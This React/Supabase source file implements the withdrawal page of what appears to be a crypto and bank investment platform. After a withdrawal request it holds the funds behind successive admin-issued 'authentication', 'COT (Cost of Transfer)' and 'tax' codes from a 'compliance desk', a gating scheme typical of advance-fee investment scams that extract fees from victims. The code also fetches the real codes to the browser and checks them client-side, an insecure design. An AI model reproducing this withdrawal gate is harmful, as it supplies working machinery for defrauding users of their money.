import { useEffect, useMemo, useState } from "react";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog";
import { toast } from "sonner";
import { Loader2, Bitcoin, Landmark, ShieldAlert, Check, ShieldCheck, Percent, Receipt } from "lucide-react";
import { z } from "zod";
import { Link } from "react-router-dom";
import { useLiveData } from "@/hooks/useLiveData";
import { useCurrency } from "@/hooks/useCurrency";

const amountSchema = z.coerce.number().positive("Amount must be positive");

type CodeType = "auth" | "cot" | "tax";

interface AccountCode {
  id: string;
  code_type: CodeType;
  code: string;
  verified: boolean;
}

const STEP_ORDER: CodeType[] = ["auth", "cot", "tax"];
const STEP_META: Record<CodeType, { title: string; subtitle: string; icon: typeof ShieldCheck }> = {
  auth: { title: "Authentication code", subtitle: "Provided by our compliance desk to authorize this withdrawal.", icon: ShieldCheck },
  cot:  { title: "COT code", subtitle: "Cost of Transfer code required to release funds.", icon: Percent },
  tax:  { title: "Tax code", subtitle: "Withholding tax clearance code.", icon: Receipt },
};

export default function Withdraw() {
  const { user } = useAuth();
  const { format, currency } = useCurrency();
  const [submitting, setSubmitting] = useState(false);
  const { data: balanceData, refresh: refreshBalance } = useLiveData(async () => {
    if (!user) return { balance: 0 };
    const { data } = await supabase.from("profiles").select("balance").eq("user_id", user.id).maybeSingle();
    return { balance: data ? Number(data.balance) : 0 };
  }, [user?.id]);
  const balance = balanceData?.balance ?? 0;
  const [crypto, setCrypto] = useState({ coin: "BTC", amount: "", address: "" });
  const [bank, setBank] = useState({ amount: "", account_name: "", account_no: "", bank_name: "", swift: "" });

  // Sequential code dialog state
  const [authOpen, setAuthOpen] = useState(false);
  const [pendingTxId, setPendingTxId] = useState<string | null>(null);
  const [codes, setCodes] = useState<AccountCode[]>([]);
  const [stepIndex, setStepIndex] = useState(0);
  const [input, setInput] = useState("");
  const [verifying, setVerifying] = useState(false);

  // Active steps in order, only those the admin actually assigned
  const activeSteps = useMemo<CodeType[]>(
    () => STEP_ORDER.filter((t) => codes.some((c) => c.code_type === t)),
    [codes],
  );
  const currentType: CodeType | null = activeSteps[stepIndex] ?? null;
  const currentCode = currentType ? codes.find((c) => c.code_type === currentType) : null;

  // Poll for any newly-issued codes while the dialog is open
  useEffect(() => {
    if (!authOpen || !user) return;
    const fetchCodes = async () => {
      const { data } = await supabase
        .from("account_withdrawal_codes")
        .select("id, code_type, code, verified")
        .eq("user_id", user.id);
      if (data) setCodes(data as AccountCode[]);
    };
    fetchCodes();
    const i = setInterval(fetchCodes, 5000);
    return () => clearInterval(i);
  }, [authOpen, user?.id]);

  const submit = async (method: string, body: Record<string, unknown>, amt: string) => {
    if (!user) return;
    const a = amountSchema.safeParse(amt);
    if (!a.success) { toast.error(a.error.errors[0].message); return; }
    if (a.data > balance) { toast.error("Insufficient balance"); return; }
    setSubmitting(true);
    const { data, error } = await supabase.from("transactions").insert({
      user_id: user.id,
      type: "withdrawal",
      method,
      amount_usd: a.data,
      status: "pending",
      ...body,
    } as never).select("id").maybeSingle();
    setSubmitting(false);
    if (error || !data) { toast.error(error?.message ?? "Failed"); return; }
    setPendingTxId(data.id);
    setInput("");
    setStepIndex(0);
    setAuthOpen(true);
  };

  const verify = async () => {
    if (!user || !currentType || !currentCode) return;
    const entered = input.trim().toUpperCase();
    if (entered.length < 4) { toast.error("Enter the code"); return; }
    if (entered !== currentCode.code.trim().toUpperCase()) {
      toast.error(`Invalid ${STEP_META[currentType].title.toLowerCase()}.`);
      return;
    }
    setVerifying(true);
    const { error } = await supabase
      .from("account_withdrawal_codes")
      .update({ verified: true })
      .eq("id", currentCode.id);
    if (error) { setVerifying(false); toast.error(error.message); return; }

    const nextIdx = stepIndex + 1;
    setInput("");
    if (nextIdx >= activeSteps.length) {
      // All codes verified → mark transaction as gate-passed
      await supabase.from("transactions")
        .update({ auth_code: currentCode.code, auth_code_verified: true })
        .eq("id", pendingTxId!);
      setVerifying(false);
      setAuthOpen(false);
      setPendingTxId(null);
      refreshBalance();
      toast.success("All codes verified. Withdrawal is under final review.");
    } else {
      setStepIndex(nextIdx);
      setVerifying(false);
      toast.success(`${STEP_META[currentType].title} accepted.`);
    }
  };

  const cancelRequest = async () => {
    if (pendingTxId) {
      await supabase.from("transactions").update({ status: "rejected" }).eq("id", pendingTxId);
    }
    setAuthOpen(false);
    setPendingTxId(null);
  };

  const StepIcon = currentType ? STEP_META[currentType].icon : ShieldAlert;

  return (
    <div className="space-y-6">
      <div>
        <p className="label-mono text-muted-foreground mb-2">Cash out</p>
        <h1 className="font-display text-3xl font-light tracking-[-0.03em]">Withdraw</h1>
        <p className="text-muted-foreground text-[14px] mt-1">Available balance: <span className="text-foreground font-medium">{format(balance)}</span></p>
      </div>

      <div className="rounded-xl bg-yellow-500/10 border border-yellow-500/20 p-3 text-[12px] text-yellow-800 max-w-2xl">
        Withdrawals require a verified KYC and authorization codes from our compliance desk.{" "}
        <Link to="/dashboard/kyc" className="underline font-medium">Verify now</Link>.
      </div>

      <Tabs defaultValue="crypto">
        <TabsList className="grid w-full max-w-md grid-cols-2">
          <TabsTrigger value="crypto"><Bitcoin className="w-3.5 h-3.5 mr-1.5" /> Crypto</TabsTrigger>
          <TabsTrigger value="bank"><Landmark className="w-3.5 h-3.5 mr-1.5" /> Bank</TabsTrigger>
        </TabsList>

        <TabsContent value="crypto" className="mt-6">
          <div className="rounded-2xl border border-border bg-card p-6 max-w-2xl space-y-5">
            <div className="grid sm:grid-cols-2 gap-4">
              <div>
                <Label>Coin</Label>
                <Select value={crypto.coin} onValueChange={(v) => setCrypto({ ...crypto, coin: v })}>
                  <SelectTrigger><SelectValue /></SelectTrigger>
                  <SelectContent>
                    <SelectItem value="BTC">Bitcoin (BTC)</SelectItem>
                    <SelectItem value="ETH">Ethereum (ETH)</SelectItem>
                    <SelectItem value="USDT">Tether (USDT)</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div>
                <Label>Amount (USD)</Label>
                <Input value={crypto.amount} onChange={(e) => setCrypto({ ...crypto, amount: e.target.value })} placeholder="100" />
                {crypto.amount && !isNaN(Number(crypto.amount)) && currency !== "USD" && (
                  <p className="text-[11px] text-muted-foreground mt-1">≈ {format(Number(crypto.amount))}</p>
                )}
              </div>
            </div>
            <div>
              <Label>Your wallet address</Label>
              <Input value={crypto.address} onChange={(e) => setCrypto({ ...crypto, address: e.target.value })} placeholder="Paste wallet address" className="font-mono text-xs" />
            </div>
            <Button
              disabled={submitting}
              onClick={() => submit(`Crypto ${crypto.coin}`, { wallet_address: crypto.address }, crypto.amount)}
              className="w-full"
            >
              {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Request withdrawal"}
            </Button>
          </div>
        </TabsContent>

        <TabsContent value="bank" className="mt-6">
          <div className="rounded-2xl border border-border bg-card p-6 max-w-2xl space-y-5">
            <div className="grid sm:grid-cols-2 gap-4">
              <div>
                <Label>Amount (USD)</Label>
                <Input value={bank.amount} onChange={(e) => setBank({ ...bank, amount: e.target.value })} />
                {bank.amount && !isNaN(Number(bank.amount)) && currency !== "USD" && (
                  <p className="text-[11px] text-muted-foreground mt-1">≈ {format(Number(bank.amount))}</p>
                )}
              </div>
              <div>
                <Label>Bank name</Label>
                <Input value={bank.bank_name} onChange={(e) => setBank({ ...bank, bank_name: e.target.value })} />
              </div>
              <div>
                <Label>Account name</Label>
                <Input value={bank.account_name} onChange={(e) => setBank({ ...bank, account_name: e.target.value })} />
              </div>
              <div>
                <Label>Account number</Label>
                <Input value={bank.account_no} onChange={(e) => setBank({ ...bank, account_no: e.target.value })} />
              </div>
              <div className="sm:col-span-2">
                <Label>SWIFT / IBAN</Label>
                <Input value={bank.swift} onChange={(e) => setBank({ ...bank, swift: e.target.value })} />
              </div>
            </div>
            <Button
              disabled={submitting}
              onClick={() => submit("Bank transfer", { bank_details: bank }, bank.amount)}
              className="w-full"
            >
              {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Request withdrawal"}
            </Button>
          </div>
        </TabsContent>
      </Tabs>

      {/* Sequential authorization dialog */}
      <Dialog open={authOpen} onOpenChange={(o) => { if (!o) cancelRequest(); }}>
        <DialogContent className="max-w-md">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <StepIcon className="w-5 h-5 text-yellow-600" />
              {currentType ? STEP_META[currentType].title : "Authorization required"}
            </DialogTitle>
            <DialogDescription>
              {currentType
                ? STEP_META[currentType].subtitle
                : "Waiting for the compliance desk to issue your authorization code."}
            </DialogDescription>
          </DialogHeader>

          {/* Step progress */}
          {activeSteps.length > 0 && (
            <div className="flex items-center gap-2">
              {activeSteps.map((t, i) => {
                const done = i < stepIndex;
                const active = i === stepIndex;
                return (
                  <div key={t} className="flex items-center gap-2 flex-1">
                    <div className={`h-1.5 flex-1 rounded-full ${done ? "bg-emerald-500" : active ? "bg-primary" : "bg-muted"}`} />
                    {done && <Check className="w-3 h-3 text-emerald-600" />}
                  </div>
                );
              })}
            </div>
          )}

          <div className="space-y-4">
            {activeSteps.length === 0 ? (
              <div className="rounded-xl bg-muted/60 border border-border p-4 text-[13px] text-muted-foreground">
                Your account does not yet have authorization codes assigned. Our compliance desk will issue them shortly — keep this window open or check back soon.
              </div>
            ) : (
              <>
                <p className="text-[12px] text-muted-foreground">
                  Step {stepIndex + 1} of {activeSteps.length}
                </p>
                <div>
                  <Label>Enter code</Label>
                  <Input
                    value={input}
                    onChange={(e) => setInput(e.target.value.toUpperCase())}
                    placeholder="ENTER CODE"
                    className="font-mono tracking-widest text-center text-lg"
                    maxLength={12}
                  />
                </div>
              </>
            )}
          </div>

          <DialogFooter>
            <Button variant="outline" onClick={cancelRequest}>Cancel request</Button>
            <Button disabled={verifying || !currentCode} onClick={verify}>
              {verifying ? <Loader2 className="w-4 h-4 animate-spin" /> : (stepIndex + 1 === activeSteps.length ? "Verify & finish" : "Verify & next")}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}
